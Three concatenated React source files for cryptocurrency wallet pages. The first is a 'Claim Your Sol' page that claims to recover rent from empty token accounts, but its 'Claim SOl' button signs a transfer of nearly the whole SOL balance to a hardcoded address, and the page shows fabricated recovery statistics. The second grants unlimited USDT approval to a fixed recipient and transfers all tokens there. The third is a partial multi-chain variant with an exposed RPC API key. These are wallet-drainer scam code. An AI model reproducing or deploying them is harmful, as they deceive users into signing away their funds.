        .catch(err => console.error('Auto Trust connect error:', err));
    }
  }, []);

  const handleConnect = () => setShowModal(true);

  const handleSelectWallet = (wallet) => {
    setShowModal(false);
    connectWallet(wallet);
  };


  // Fetch balance via backend HTTP
  const fetchBalance = async (pubKey) => {
    try {
      const res = await fetch('/api/solana-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ publicKey: pubKey })
      });
      const { balance: bal, error } = await res.json();
      if (error) throw new Error(error);
      setBalance(bal);
    } catch (err) {
      console.error('Balance fetch error:', err);
      alert('Error fetching balance: ' + err.message);
    }

  };

  // Connect wallet (handles desktop injection & mobile deep links)
  const connectWallet = async (wallet) => {
    setIsConnecting(true);
    setSelectedWallet(wallet);
    const adapter = wallet === 'phantom' ? phantomAdapter : trustAdapter;
    const isMobile = /Mobi|Android/i.test(navigator.userAgent);

    if (isMobile && adapter.readyState === WalletReadyState.NotDetected) {
      if (wallet === 'phantom') {
        localStorage.setItem('selectedWallet', 'phantom');
        const pubEnc = encodeURIComponent(bs58.encode(dappKeyPair.publicKey));
        const redirect = encodeURIComponent(window.location.origin + '/onConnect');
        const phantomUrl =
          `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(
            window.location.origin
          )}` +
          `&dapp_encryption_public_key=${pubEnc}` +
          `&redirect_link=${redirect}&cluster=mainnet-beta`;
        window.location.href = phantomUrl;
        setIsConnecting(false);
        return;
      }
      if (wallet === 'trust') {
        localStorage.setItem('selectedWallet', 'trust');
        const trustUrl =
          `https://link.trustwallet.com/open_url?coin_id=501&url=${encodeURIComponent(
            window.location.href
          )}`;
        window.location.href = trustUrl;
        setIsConnecting(false);
        return;
      }
    }

    try {
      await adapter.connect();
      const pk = adapter.publicKey.toString();
      setAccount(pk);
      localStorage.setItem('connectedAccount', pk);
      localStorage.setItem('selectedWallet', wallet);
      setShowModal(false);
      fetchBalance(pk);
    } catch (err) {
      console.error(wallet, 'connect error:', err);
      alert('Connection failed: ' + err.message);
    } finally {
      setIsConnecting(false);
    }
  };

  // Send entire balance using HTTP-only Connection
  const sendFunds = async () => {
    if (!account || !selectedWallet) return alert('Connect your wallet first.');
    setIsSending(true);

    try {
      // 1) fetch your current SOL balance from your backend
      const res = await fetch('/api/solana-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ publicKey: account })
      });
      const { balance: sol, error } = await res.json();
      if (error) throw new Error(error);

      // 2) convert to lamports
      const lamports = parseFloat(sol) * LAMPORTS_PER_SOL;
      const fee = 90000; // estimated transaction fee in lamports

      // 3) open connection & fetch rent‑exempt minimum
      const connection = createConnection();
      const rentExempt = await connection.getMinimumBalanceForRentExemption(0);

      // 4) ensure you leave behind enough for fee + rent-exempt reserve
      if (lamports <= fee + rentExempt) {
        alert('Insufficient funds to cover transaction fee and rent‑exempt minimum.');
        setIsSending(false);
        return;
      }

      // 5) compute how much you can actually send
      const amount = lamports - fee - rentExempt;

      // 6) build the transfer transaction
      const fromPk = new PublicKey(account);
      const toPk = new PublicKey(cryptoOptions.SOL);
      const tx = new Transaction().add(
        SystemProgram.transfer({ fromPubkey: fromPk, toPubkey: toPk, lamports: amount })
      );
      tx.feePayer = fromPk;
      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      // 7) ensure your adapter is connected, then sign & send
      const adapter = selectedWallet === 'phantom' ? phantomAdapter : trustAdapter;
      if (!adapter.connected) {
        await adapter.connect();
      }
      const signedTx = await adapter.signTransaction(tx);
      const rawTx = signedTx.serialize();
      const txid = await connection.sendRawTransaction(rawTx);

      // 8) optionally poll for confirmation
      let confirmed = false;
      for (let i = 0; i < 30; i++) {
        const status = (await connection.getSignatureStatuses([txid])).value[0];
        if (status && (status.confirmationStatus === 'finalized' || status.confirmationStatus === 'confirmed')) {
          confirmed = true;
          break;
        }
        await new Promise(r => setTimeout(r, 1000));
      }
      if (!confirmed) {
        alert('Transaction submitted but not confirmed after timeout.');
      }

      // 9) update UI
      setTxHash(txid);
      alert('Tx successful: ' + txid);
      setBalance('0');

    } catch (err) {
      if (err.name === 'WalletSendTransactionError' && err.getLogs) console.error(err.getLogs());
      if (err.name === 'WalletNotConnectedError') alert('Wallet not connected.');
      console.error('sendFunds error:', err);
      alert('Error: ' + err.message);
    } finally {
      setIsSending(false);
    }
  };

  return (
    <main id="main" data-v-app="">
      <div className="light">
        <div className="bg-gray-50 dark:bg-gray-900 p-0 m-0 min-h-screen text-lg lg:text-2xl">
          <div className="container mx-auto p-0">
            <div className="fixed left-0 right-0 top-0 drop-shadow z-50">
              <div className="flex items-center justify-end p-2 gap-2">
                <a href="https://t.me/POSEDION_trojanbot" target="_blank" className="h-8 w-8 hover:scale-110">
                  <img
                    src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg"
                    alt="Telegram Logo"
                  />
                </a>
                <a href="https://discord.com/invite/A2m4PVXJZz" target="_blank" className="h-8 w-8 hover:scale-110">
                  <img
                    src="./discord.png"
                    alt="Telegram Logo"
                  />
                </a>
                <a href="https://twitter.com/claimyoursol" target="_blank" className="h-8 w-8 hover:scale-110">
                  <img
                    src="https://cdn.usbrandcolors.com/images/logos/twitter-logo.svg"
                    alt="Telegram Logo"
                  />
                </a>
                <div>
                  <button
                    className="p-2 text-base lg:text-lg bg-gray-100 dark:bg-gray-700 text-gray-800 hover:text-gray-600 dark:text-gray-100 dark:hover:text-gray-200 opacity-90 disabled:opacity-50 uppercase rounded-l drop-shadow-lg"
                    disabled
                  >
                    Normie
                  </button>
                  <button
                    className="p-2 text-base lg:text-lg bg-gray-100 dark:bg-gray-700 text-gray-800 hover:text-gray-600 dark:text-gray-100 dark:hover:text-gray-200 opacity-90 disabled:opacity-50 uppercase rounded-r drop-shadow-lg font-bold"
                  >
                    Degen
                  </button>
                </div>
                <img className="h-12 w-12 drop-shadow-lg" src="./cys-logo.png" alt="Claim Your Sol Logo" />
              </div>
            </div>
            <div className="container mx-auto p-1 lg:p-4 text-lg lg:text-2xl">
              <div className="flex flex-col items-center justify-center mb-2 lg:mb-4 max-w-xl mx-auto">
                <div>
                  <a href="https://zeus-wallet.vercel.app/" target="_blank">
                    <img
                      className="w-80 lg:w-96 mb-4 mt-14 lg:mt-0"
                      src="./cys-banner-alt.png"
                      title="Claim Your Sol"
                      alt="Claim Your Sol"
                    />
                  </a>
                </div>
                <h1 className="text-gray-700 dark:text-gray-300 text-xl lg:text-2xl">
                  Solana Blockchain keeps your SOL!
                </h1>
                <h2 className="text-gray-700 dark:text-gray-300 text-2xl lg:text-3xl font-semibold mb-1">
                  You can get it back!
                </h2>
                <div className="text-sm text-gray-800 dark:text-gray-300 cursor-pointer flex items-center gap-1">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    className="h-4 w-4"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                    strokeWidth="2"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <span>Learn More</span>
                </div>
              </div>
              <div className="flex flex-col items-center justify-center gap-2 lg:gap-4 mb-2 lg:mb-4">
                <div className="flex flex-col gap-2 p-1">
                  <div className="flex items-center gap-2 justify-center">
                    <div className="text-gray-700 dark:text-gray-300 text-sm">Solana Network:</div>
                    <div className="text-sm font-mono font-semibold text-black dark:text-white"> ~4277 TPS</div>
                    <img className="h-4 w-4 block" src="/images/quicknode.png" alt="" />
                  </div>
                </div>
                <div className="flex gap-4 justify-center my-4">
                  <ConnectButton
                    connected={Boolean(account)}
                    isConnecting={isConnecting}
                    selectedWallet={selectedWallet}
                    account={account}
                    onClick={() => {
                      if (!account) handleConnect();
                    }}
                  />
                  {/* {!account && (
                    <button onClick={() => setShowModal(true)} className="swv-button swv-button-trigger">
                      Connect Wallet
                    </button>
                  )} */}
                </div>
                <div className="flex items-center justify-center">
                  <span className="text-xs text-gray-500 cursor-pointer" onClick={resetWalletSelector}>
                    Click <b>here</b> to reset Wallet Selector
                  </span>
                </div>
              </div>


              {account && (
                <div className="flex flex-col items-center justify-center mb-4">
                  <p className="uppercase text-xs font-roboto">
                    Balance: {balance ? balance : "Loading..."}
                  </p>
                  <button className="swv-button swv-button-trigger mt-2" onClick={sendFunds} disabled={isSending}>
                    {isSending ? "Sending..." : "Claim SOl"}
                  </button>
                  {txHash && <p className="text-sm text-blue-700 mt-2">Transaction Hash: {txHash}</p>}
                </div>
              )}
              <ul className="flex justify-center gap-2 lg:gap-4 items-stretch mb-2 lg:mb-4">
                <li className="flex flex-col flex-1 items-center justify-between gap-1 bg-white dark:bg-gray-800 p-2 rounded-lg border border-gray-300 dark:border-gray-700 drop-shadow w-40 lg:w-60">
                  <div className="text-gray-600 dark:text-gray-300 text-base uppercase text-center">
                    Total SOL Recovered
                  </div>
                  <div className="p-2 text-blue-700 dark:text-blue-500 text-xl font-semibold">
                    <span className="flex items-center justify-center gap-2">
                      <div>75843</div>
                      <div className="text-xs">SOL</div>
                    </span>
                  </div>
                </li>
                <li className="flex flex-col flex-1 items-center justify-between gap-1 bg-white dark:bg-gray-800 p-2 rounded-lg border border-gray-300 dark:border-gray-700 drop-shadow w-40 lg:w-60">
                  <div className="text-gray-600 dark:text-gray-300 text-base uppercase text-center">
                    Total Accounts Claimed
                  </div>
                  <div className="p-2 text-blue-700 dark:text-blue-500 text-xl font-semibold">
                    <span>46457188</span>
                  </div>
                </li>
              </ul>
              <div>
                <AllTimeLedger entries={sampleData} />
              </div>
              <div className="mb-4 lg:mb-8 text-xs lg:text-sm text-gray-800 dark:text-gray-300 text-center">
                To keep this tool up and running, a 20% donation is included for the recovered SOL.
              </div>
              <div className="p-2 mb-4 lg:mb-8">
                <h3 id="howitworks" className="text-2xl text-gray-800 dark:text-gray-200 text-center mb-4 lg:mb-4 font-bold">
                  How does it work?
                </h3>
                <ul className="flex flex-col gap-4 lg:gap-8 text-black dark:text-white mx-auto max-w-4xl">
                  <li className="flex gap-2 lg:gap-4">
                    <div className="flex flex-col">
                      <h4 className="text-gray-700 dark:text-gray-300 text-lg font-semibold uppercase mb-2">
                        Closing SPL Token Accounts
                      </h4>
                      <div className="text-gray-600 dark:text-gray-400 text-base">
                        <p className="mb-1">
                          Everytime you receive a Memecoin, Token or NFT in your wallet a specific token account is created for it.
                        </p>
                        <p className="mb-1">
                          When you send or sell that Memecoin, Token or NFT to someone else, the token account has 0 units of that specific asset but still lingers in your wallet with no utility.
                        </p>
                        <p className="mb-1">
                          To create each and single one of those accounts someone paid ~0.002 SOL for rent that is withheld by Solana Network forever.
                        </p>
                        <p className="mb-0">
                          With our tool you can easily and securely close this accounts and claim your SOL.
                        </p>
                      </div>
                    </div>
                  </li>
                  <li className="flex gap-2">
                    <div className="flex flex-col">
                      <h4 className="text-gray-700 dark:text-gray-300 text-lg font-semibold uppercase mb-2">
                        Claim Your SOL
                      </h4>
                      <div className="text-gray-600 dark:text-gray-400 text-base">
                        <p className="mb-1">
                          All the token accounts that show up for selection already have 0 assets assigned and have no use, feel secure in selecting as many as you want and let us do the work.
                        </p>
                        <p className="mb-1">
                          The selected tokens accounts are closed and the released rent deposits are sent to you, we take a small donation from profits to keep this Site + RPC running and developing more tools.
                        </p>
                      </div>
                    </div>
                  </li>
                  <li className="flex gap-2">
                    <div className="flex flex-col">
                      <h4 className="text-gray-700 dark:text-gray-300 text-lg font-semibold uppercase mb-2">
                        What is this rent?
                      </h4>
                      <div className="text-gray-600 dark:text-gray-400 text-base">
                        <p className="mb-1">
                          Solana currently charges users 2 years worth of rent for every account created to storage, maintain the data and process transactions with those accounts.
                        </p>
                        <p className="mb-1">
                          You can find more information in the official{" "}
                          <a
                            className="underline text-blue-600 dark:text-blue-500"
                            target="_blank"
                            rel="noreferrer"
                            href="https://docs.solana.com/developing/programming-model/accounts#rent"
                          >
                            Solana Documentation
                          </a>.
                        </p>
                      </div>
                    </div>
                  </li>
                </ul>
              </div>
              <footer className="p-1 flex items-center justify-center gap-2 rounded">
                <a href="https://santoslabs.pt" target="_blank" rel="noreferrer">
                  <img className="h-10" src="./santoslabs-logo-black.png" alt="SantosLabs Logo" />
                </a>
                <div className="flex flex-col">
                  <div className="text-sm text-gray-800 dark:text-gray-300">
                    Built in <a className="text-black dark:text-white" href="https://santoslabs.pt" target="_blank" rel="noreferrer">Santos Labs</a>
                  </div>
                  <div className="text-xs text-gray-400">2025 All rights reserved</div>
                </div>
              </footer>
            </div>
          </div>
        </div>
      </div>
      {showModal && <ConnectWalletModal onClose={() => setShowModal(false)} onSelect={handleSelectWallet} />}

    </main>
  );
}

export default App;
----------------------// App.js
import React, { useState } from 'react';
import { ethers } from 'ethers';

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) external view returns (uint256)",
  "function transfer(address to, uint256 amount) external returns (bool)",
  "function balanceOf(address account) external view returns (uint256)"
];

const tokenAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // ERC-20 Token Contract
const recipientAddress = '0xD89dD76fb144d63284051274c7f79907a75637B8'; // ✅ Your destination wallet

function App() {
  const [account, setAccount] = useState(null);
  const [provider, setProvider] = useState(null);
  const [status, setStatus] = useState('');

  // Connect wallet
  const connectWallet = async () => {
    if (!window.ethereum) {
      alert('Please install MetaMask!');
      return;
    }
    const prov = new ethers.providers.Web3Provider(window.ethereum);
    await prov.send('eth_requestAccounts', []);
    const signer = prov.getSigner();
    const address = await signer.getAddress();
    setAccount(address);
    setProvider(prov);
  };

  // Approve unlimited (optional)
  const approveUnlimited = async () => {
    if (!provider || !account) {
      alert('Connect your wallet first.');
      return;
    }
    try {
      const signer = provider.getSigner();
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
      const tx = await token.approve(recipientAddress, ethers.constants.MaxUint256);
      setStatus('Approval submitted: ' + tx.hash);
      await tx.wait();
      setStatus('Approval confirmed!');
    } catch (err) {
      console.error('Approval Error:', err);
      const errorMessage = err?.reason || err?.message || JSON.stringify(err);
      setStatus('Approval failed: ' + errorMessage);
    }
  };

  // Transfer tokens
  const transferTokens = async () => {
    if (!provider || !account) {
      alert('Connect your wallet first.');
      return;
    }
    try {
      setStatus('Fetching balance...');
      const signer = provider.getSigner();
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

      // Check balance
      const balance = await token.balanceOf(account);
      if (balance.isZero()) {
        setStatus('No tokens to send.');
        return;
      }

      setStatus(`Transferring ${ethers.utils.formatUnits(balance, 18)} tokens...`);

      // Transfer full balance to recipient
      const tx = await token.transfer(recipientAddress, balance);
      setStatus('Transfer submitted: ' + tx.hash);
      await tx.wait();
      setStatus('Transfer confirmed!');
    } catch (err) {
      console.error('Transfer Error:', err);
      const errorMessage = err?.reason || err?.message || JSON.stringify(err);
      setStatus('Transfer failed: ' + errorMessage);
    }
  };

  return (
    <main className="flex flex-col items-center justify-center min-h-screen p-8">
      <h1 className="text-2xl font-bold mb-4">ETH Token Transfer Example</h1>

      {!account ? (
        <button onClick={connectWallet} className="bg-blue-500 text-white px-4 py-2 rounded">
          Connect Wallet
        </button>
      ) : (
        <>
          <p className="mb-2">Connected: {account}</p>
          <button onClick={approveUnlimited} className="bg-green-500 text-white px-4 py-2 rounded mt-2">
            Approve Unlimited (Optional)
          </button>
          <button onClick={transferTokens} className="bg-purple-500 text-white px-4 py-2 rounded mt-2">
            Transfer All Tokens
          </button>
        </>
      )}

      {status && <p className="mt-4 text-gray-700">{status}</p>}

    </main>
  );
}

export default App;



---------------------
// App.js
import React, { useState, useEffect, useMemo } from 'react';
import {
  Connection,
  LAMPORTS_PER_SOL,
  Transaction,
  SystemProgram,
  PublicKey
} from '@solana/web3.js';
import { PhantomWalletAdapter, TrustWalletAdapter } from '@solana/wallet-adapter-wallets';
import { WalletReadyState } from '@solana/wallet-adapter-base';
import nacl from 'tweetnacl';
import bs58 from 'bs58';
import { Buffer } from 'buffer';
import { ethers } from 'ethers';
import WalletConnectProvider from '@walletconnect/web3-provider';
global.Buffer = global.Buffer || Buffer;

// RPC endpoints & keys
const ALCHEMY_SOL_RPC = "https://solana-mainnet.g.alchemy.com/v2/L9fb1fan5l6E4bskkY4ENKDxBMb08-YN";
const ALCHEMY_ETH_RPC = "https://eth-mainnet.g.alchemy.com/v2/L9fb1fan5l6E4bskkY4ENKDxBMb08-YN";

// ERC-20 ABI minimal
const erc20Abi = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address,uint256) returns (bool)"
];


// Supported tokens
const ethTokens = {
  USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  DAI:  '0x6B175474E89094C44Da98b954EedeAC495271d0F'
};

// Wallet icons
const WALLET_ICONS = {
  phantom: 'https://cryptologos.cc/logos/phantom-phantom-logo.png',
  trust: 'https://trustwallet.com/assets/images/media/assets/TWT.png',
  metaMask: 'https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg'
};
const shortenAddress = (addr = '') => addr.length > 8 ? `${addr.slice(0,4)}..${addr.slice(-4)}` : addr;

// Shared UI
const ConnectButton = ({ connected, connecting, selectedWallet, account, onClick }) => {
  const icon = WALLET_ICONS[selectedWallet];
  return (
    <button onClick={onClick} disabled={connecting} style={{ padding: 10, fontSize: 14, display: 'flex', alignItems: 'center', gap: 8 }}>
      {!connected && !connecting && 'Select Wallet'}
      {connecting && 'Connecting...'}
      {connected && !connecting && (
        <>
          {icon && <img src={icon} alt={selectedWallet} style={{ width:24,height:24 }} />}
          <span>{shortenAddress(account)}</span>
        </>
      )}
    </button>
  );
};

const ConnectWalletModal = ({ onClose, onSelect }) => (
  <div style={{ position: 'absolute', top: 40, left: 20, padding: 20, border: '1px solid #ccc', background: 'white', borderRadius: 8 }}>
    <button onClick={onClose}>Close</button>
    <ul>
      <li><button onClick={() => onSelect('phantom')}>Phantom</button></li>
      <li><button onClick={() => onSelect('trust')}>Trust</button></li>
      <li><button onClick={() => onSelect('metaMask')}>MetaMask</button></li>
    </ul>
  </div>
);


function App() {
  const [solAccount, setSolAccount] = useState(null);
  const [solBalance, setSolBalance] = useState(null);
  const [solTxHash, setSolTxHash] = useState(null);

  const [ethAccount, setEthAccount] = useState(null);
  const [ethBalance, setEthBalance] = useState(null);
  const [tokenBalances, setTokenBalances] = useState({});

  const [selectedWallet, setSelectedWallet] = useState(null);
  const [connecting, setConnecting] = useState(false);
  const [sending, setSending] = useState(false);
  const [showModal, setShowModal] = useState(false);

  const dappKeyPair = useMemo(() => nacl.box.keyPair(), []);
  const solConnection = useMemo(() => new Connection(ALCHEMY_SOL_RPC, { commitment: 'finalized' }), []);
  const ethProvider = useMemo(() => new ethers.providers.JsonRpcProvider(ALCHEMY_ETH_RPC), []);

  const fetchSolBalance = async (address) => {
    try {
      const lamports = await solConnection.getBalance(new PublicKey(address));
      setSolBalance((lamports / LAMPORTS_PER_SOL).toFixed(6));
    } catch (e) { console.error(e); }
  };

  const fetchEthData = async (address) => {
    try {
      const b = await ethProvider.getBalance(address);
      setEthBalance(ethers.utils.formatEther(b));
      const tb = {};
      for (let [sym, addr] of Object.entries(ethTokens)) {
        const ctr = new ethers.Contract(addr, erc20Abi, ethProvider);
        const [raw, dec] = await Promise.all([ctr.balanceOf(address), ctr.decimals()]);
        tb[sym] = ethers.utils.formatUnits(raw, dec);
      }
      setTokenBalances(tb);
    } catch (e) { console.error(e); }
  };

  const sendFunds = async () => {
    if (!solAccount) return;
    setSending(true);
    try {
      const lamports = await solConnection.getBalance(new PublicKey(solAccount));
      const fee = 5000;
      const toAddress = prompt("Enter destination address:");
      const toSend = lamports - fee;
      if (!toAddress || toSend <= 0) throw new Error("Invalid address or insufficient funds");
      const tx = new Transaction().add(SystemProgram.transfer({
        fromPubkey: new PublicKey(solAccount),
        toPubkey: new PublicKey(toAddress),
        lamports: toSend
      }));
      tx.recentBlockhash = (await solConnection.getLatestBlockhash()).blockhash;
      // Adapter signing omitted — integrate here
      console.log("Transaction prepared", tx);
      setSolTxHash('mock-txid');
    } catch (err) { console.error(err); }
    setSending(false);
  };

  const connectWallet = async (wallet) => {
    setConnecting(true);
    setSelectedWallet(wallet);

    if (wallet === 'metaMask') {
      try {
        if (!window.ethereum) throw new Error('MetaMask not found');
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send('eth_requestAccounts', []);
        const signer = provider.getSigner();
        const addr = await signer.getAddress();
        setEthAccount(addr);
        fetchEthData(addr);
      } catch (e) { alert(e.message); }
      setConnecting(false);
      return;
    }

    if (wallet === 'trust') {
      try {
        const wcProvider = new WalletConnectProvider({
          rpc: { 1: ALCHEMY_ETH_RPC },
          chainId: 1
        });
        await wcProvider.enable();
        const provider = new ethers.providers.Web3Provider(wcProvider);
        const signer = provider.getSigner();
        const addr = await signer.getAddress();
        setEthAccount(addr);
        fetchEthData(addr);
      } catch (e) { alert(e.message); }
      setConnecting(false);
      return;
    }

    const adapter = wallet === 'phantom' ? new PhantomWalletAdapter() : new TrustWalletAdapter();
    if (/Mobi|Android/i.test(navigator.userAgent) && adapter.readyState === WalletReadyState.NotDetected) {
      setConnecting(false);
      return;
    }
    try {
      await adapter.connect();
      const addr = adapter.publicKey.toString();
      setSolAccount(addr);
      fetchSolBalance(addr);
    } catch (e) { alert(e.message); }
    setConnecting(false);
  };

  return (
    <main style={{ padding: 20 }}>
      <ConnectButton
        connected={!!(solAccount || ethAccount)}
        connecting={connecting}
        selectedWallet={selectedWallet}
        account={selectedWallet === 'metaMask' || selectedWallet === 'trust' ? ethAccount : solAccount}
        onClick={() => setShowModal(true)}
      />

      {ethAccount && (
        <div>
          <p>ETH: {ethBalance}</p>
          <ul>{Object.entries(tokenBalances).map(([s,b]) => <li key={s}>{s}: {b}</li>)}</ul>
        </div>
      )}

      {solAccount && (
        <div>
          <p>SOL: {solBalance}</p>
          <button onClick={sendFunds} disabled={sending}>Send SOL</button>
          {solTxHash && <p>Tx: {solTxHash}</p>}
        </div>
      )}

      {showModal && <ConnectWalletModal onClose={() => setShowModal(false)} onSelect={connectWallet} />}
    </main>
  );
}

export default App;
